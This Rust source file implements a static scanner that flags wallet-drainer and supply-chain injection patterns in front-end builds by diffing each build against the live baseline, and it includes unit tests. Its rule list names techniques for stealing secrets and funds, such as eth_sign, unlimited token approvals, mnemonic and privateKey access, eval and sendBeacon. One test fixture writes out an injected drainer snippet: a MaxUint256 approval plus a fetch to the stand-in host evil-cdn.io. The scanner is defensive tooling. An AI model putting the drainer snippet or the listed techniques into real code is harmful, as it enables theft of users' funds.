//! Immutex Sentinel core: a pure, IO-free static scanner for wallet-drainer and
//! supply-chain injection patterns in static front-end builds.
//!
//! The scanner never decides alone. It produces findings; a staked Sentinel
//! agent turns them into an on-chain attestation (`immutex::site::attest`).
//! The most important signal is the *diff against the last live build*: a
//! pattern that already shipped and was reviewed is far less suspicious than
//! one that appears for the first time in a new build.

use std::collections::BTreeSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Info,
    Review,
    High,
}

impl Severity {
    pub fn as_str(self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Review => "review",
            Severity::High => "high",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Clean,
    Review,
    Block,
}

impl Verdict {
    pub fn as_str(self) -> &'static str {
        match self {
            Verdict::Clean => "clean",
            Verdict::Review => "review",
            Verdict::Block => "block",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub rule: &'static str,
    pub severity: Severity,
    pub file: String,
    pub line: usize,
    pub excerpt: String,
    /// True when this rule did not fire anywhere in the baseline build.
    pub introduced: bool,
}

#[derive(Debug, Clone)]
pub struct Report {
    pub verdict: Verdict,
    pub files_scanned: usize,
    pub findings: Vec<Finding>,
    /// External origins referenced by the new build but not by the baseline.
    pub new_origins: Vec<String>,
}

pub struct SourceFile<'a> {
    pub path: &'a str,
    pub content: &'a str,
}

struct Rule {
    id: &'static str,
    severity: Severity,
    /// Any of these tokens triggers the rule. Tokens ending in an identifier
    /// character are matched on identifier boundaries.
    any: &'static [&'static str],
}

const RULES: &[Rule] = &[
    Rule {
        id: "raw-eth-sign",
        severity: Severity::High,
        any: &["eth_sign"],
    },
    Rule {
        id: "unlimited-approval",
        severity: Severity::High,
        any: &[
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            "MaxUint256",
            "maxUint256",
            "MAX_UINT256",
        ],
    },
    Rule {
        id: "set-approval-for-all",
        severity: Severity::Review,
        any: &["setApprovalForAll"],
    },
    Rule {
        id: "permit-signature",
        severity: Severity::Review,
        any: &["PermitSingle", "PermitBatch", "PermitTransferFrom", "Permit2"],
    },
    Rule {
        id: "bulk-tx-signing",
        severity: Severity::Review,
        any: &["signAllTransactions"],
    },
    Rule {
        id: "dynamic-code-eval",
        severity: Severity::High,
        any: &["eval(", "new Function(", "setTimeout(\"", "setTimeout('"],
    },
    Rule {
        id: "runtime-script-injection",
        severity: Severity::Review,
        any: &["createElement(\"script\")", "createElement('script')", "createElement(`script`)"],
    },
    Rule {
        id: "secret-material",
        severity: Severity::High,
        any: &["mnemonic", "seedPhrase", "seed_phrase", "privateKey", "secretKey"],
    },
    Rule {
        id: "beacon-exfiltration",
        severity: Severity::Review,
        any: &["sendBeacon("],
    },
];

const LONG_LITERAL_THRESHOLD: usize = 4096;
const OBFUSCATED_IDENT_THRESHOLD: usize = 40;

fn is_ident(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_' || c == '$'
}

/// Byte offsets of `token` in `hay`, respecting identifier boundaries on
/// whichever ends of the token are identifier characters (so `eth_sign`
/// does not match `eth_signTypedData_v4`).
fn find_token(hay: &str, token: &str) -> Vec<usize> {
    let head_ident = token.chars().next().map(is_ident).unwrap_or(false);
    let tail_ident = token.chars().last().map(is_ident).unwrap_or(false);
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(rel) = hay[from..].find(token) {
        let at = from + rel;
        let end = at + token.len();
        let before_ok = !head_ident || hay[..at].chars().last().map(|c| !is_ident(c)).unwrap_or(true);
        let after_ok = !tail_ident || hay[end..].chars().next().map(|c| !is_ident(c)).unwrap_or(true);
        if before_ok && after_ok {
            out.push(at);
        }
        from = end;
    }
    out
}

fn line_of(hay: &str, offset: usize) -> usize {
    hay[..offset].bytes().filter(|b| *b == b'\n').count() + 1
}

fn excerpt(hay: &str, offset: usize) -> String {
    let mut start = offset.saturating_sub(40);
    while !hay.is_char_boundary(start) {
        start -= 1;
    }
    let mut end = (offset + 80).min(hay.len());
    while !hay.is_char_boundary(end) {
        end += 1;
    }
    hay[start..end].replace(['\n', '\r'], " ")
}

fn scannable(path: &str) -> bool {
    let p = path.to_ascii_lowercase();
    [".js", ".mjs", ".cjs", ".html", ".htm", ".svg", ".wasm.js"]
        .iter()
        .any(|ext| p.ends_with(ext))
}

/// Origins (`scheme://host`) referenced in a file.
pub fn extract_origins(content: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for scheme in ["https://", "http://", "wss://", "ws://"] {
        let mut from = 0;
        while let Some(rel) = content[from..].find(scheme) {
            let at = from + rel;
            let host_start = at + scheme.len();
            let host: String = content[host_start..]
                .chars()
                .take_while(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '-' || *c == ':')
                .collect();
            if host.contains('.') {
                out.insert(format!("{}{}", scheme, host.to_ascii_lowercase()));
            }
            from = host_start;
        }
    }
    out
}

fn raw_findings(files: &[SourceFile]) -> (Vec<Finding>, BTreeSet<String>, usize) {
    let mut findings = Vec::new();
    let mut origins = BTreeSet::new();
    let mut scanned = 0;
    for f in files.iter().filter(|f| scannable(f.path)) {
        scanned += 1;
        origins.extend(extract_origins(f.content));
        for rule in RULES {
            // One finding per rule per file keeps reports readable for agents.
            if let Some(at) = rule.any.iter().flat_map(|t| find_token(f.content, t)).min() {
                findings.push(Finding {
                    rule: rule.id,
                    severity: rule.severity,
                    file: f.path.to_string(),
                    line: line_of(f.content, at),
                    excerpt: excerpt(f.content, at),
                    introduced: true,
                });
            }
        }
        if let Some(at) = long_literal(f.content) {
            findings.push(Finding {
                rule: "long-encoded-literal",
                severity: Severity::Review,
                file: f.path.to_string(),
                line: line_of(f.content, at),
                excerpt: excerpt(f.content, at),
                introduced: true,
            });
        }
        let obf = find_token(f.content, "_0x").len();
        if obf >= OBFUSCATED_IDENT_THRESHOLD {
            findings.push(Finding {
                rule: "obfuscated-identifiers",
                severity: Severity::Review,
                file: f.path.to_string(),
                line: 1,
                excerpt: format!("{} `_0x…` identifiers", obf),
                introduced: true,
            });
        }
    }
    (findings, origins, scanned)
}

/// Offset of the first string literal longer than the threshold made only of
/// base64/hex characters (typical of packed payloads).
fn long_literal(content: &str) -> Option<usize> {
    let mut run_start = 0;
    let mut run = 0usize;
    for (i, c) in content.char_indices() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' {
            if run == 0 {
                run_start = i;
            }
            run += 1;
            if run >= LONG_LITERAL_THRESHOLD {
                return Some(run_start);
            }
        } else {
            run = 0;
        }
    }
    None
}

/// Scan a candidate build, optionally against the currently-live baseline.
pub fn scan(candidate: &[SourceFile], baseline: Option<&[SourceFile]>) -> Report {
    let (mut findings, origins, scanned) = raw_findings(candidate);
    let mut new_origins: Vec<String> = Vec::new();

    if let Some(base) = baseline {
        let (base_findings, base_origins, _) = raw_findings(base);
        let base_rules: BTreeSet<&str> = base_findings.iter().map(|f| f.rule).collect();
        for f in findings.iter_mut() {
            f.introduced = !base_rules.contains(f.rule);
        }
        new_origins = origins.difference(&base_origins).cloned().collect();
    }

    findings.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.file.cmp(&b.file)));

    let verdict = if findings.iter().any(|f| f.introduced && f.severity == Severity::High) {
        Verdict::Block
    } else if !new_origins.is_empty() || findings.iter().any(|f| f.introduced && f.severity >= Severity::Review) {
        Verdict::Review
    } else {
        Verdict::Clean
    };

    Report { verdict, files_scanned: scanned, findings, new_origins }
}

fn json_str(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

impl Report {
    pub fn to_json(&self) -> String {
        let findings: Vec<String> = self
            .findings
            .iter()
            .map(|f| {
                format!(
                    "{{\"rule\":{},\"severity\":{},\"file\":{},\"line\":{},\"excerpt\":{},\"introduced\":{}}}",
                    json_str(f.rule),
                    json_str(f.severity.as_str()),
                    json_str(&f.file),
                    f.line,
                    json_str(&f.excerpt),
                    f.introduced
                )
            })
            .collect();
        let origins: Vec<String> = self.new_origins.iter().map(|o| json_str(o)).collect();
        format!(
            "{{\"verdict\":{},\"files_scanned\":{},\"findings\":[{}],\"new_origins\":[{}]}}",
            json_str(self.verdict.as_str()),
            self.files_scanned,
            findings.join(","),
            origins.join(",")
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn f<'a>(path: &'a str, content: &'a str) -> SourceFile<'a> {
        SourceFile { path, content }
    }

    #[test]
    fn clean_build_is_clean() {
        let r = scan(&[f("app.js", "const x = await provider.request({method:'eth_requestAccounts'})")], None);
        assert_eq!(r.verdict, Verdict::Clean);
        assert!(r.findings.is_empty());
    }

    #[test]
    fn eth_sign_matches_on_boundary_only() {
        let typed = scan(&[f("a.js", "method: 'eth_signTypedData_v4'")], None);
        assert!(typed.findings.iter().all(|x| x.rule != "raw-eth-sign"));
        let raw = scan(&[f("a.js", "method: 'eth_sign', params")], None);
        assert_eq!(raw.verdict, Verdict::Block);
        assert_eq!(raw.findings[0].rule, "raw-eth-sign");
    }

    #[test]
    fn baseline_pattern_is_not_introduced() {
        let base = [f("a.js", "nft.setApprovalForAll(market, true)")];
        let cand = [f("a.js", "nft.setApprovalForAll(market, true); // v2")];
        let r = scan(&cand, Some(&base));
        assert_eq!(r.verdict, Verdict::Clean);
        assert!(!r.findings[0].introduced);
    }

    #[test]
    fn injected_drainer_blocks_against_baseline() {
        let base = [f("a.js", "fetch('https://api.mydex.xyz/quote')")];
        let cand = [f(
            "a.js",
            "fetch('https://api.mydex.xyz/quote');\ntoken.approve(spender, MaxUint256);\nfetch('https://evil-cdn.io/c')",
        )];
        let r = scan(&cand, Some(&base));
        assert_eq!(r.verdict, Verdict::Block);
        assert_eq!(r.new_origins, vec!["https://evil-cdn.io".to_string()]);
        let hit = r.findings.iter().find(|x| x.rule == "unlimited-approval").unwrap();
        assert_eq!(hit.line, 2);
    }

    #[test]
    fn new_origin_alone_requires_review() {
        let base = [f("index.html", "<script src=\"https://cdn.a.com/x.js\"></script>")];
        let cand = [f("index.html", "<script src=\"https://cdn.b.com/x.js\"></script>")];
        assert_eq!(scan(&cand, Some(&base)).verdict, Verdict::Review);
    }

    #[test]
    fn non_code_files_are_ignored() {
        let r = scan(&[f("README.md", "eval( mnemonic")], None);
        assert_eq!(r.files_scanned, 0);
        assert_eq!(r.verdict, Verdict::Clean);
    }

    #[test]
    fn long_payload_is_flagged() {
        let payload = format!("var p='{}';", "A".repeat(LONG_LITERAL_THRESHOLD + 1));
        let r = scan(&[f("x.js", &payload)], None);
        assert!(r.findings.iter().any(|x| x.rule == "long-encoded-literal"));
    }

    #[test]
    fn json_escapes() {
        let r = scan(&[f("a\"b.js", "eval(\"x\")")], None);
        let j = r.to_json();
        assert!(j.contains("\"file\":\"a\\\"b.js\""));
        assert!(j.starts_with("{\"verdict\":\"block\""));
    }
}
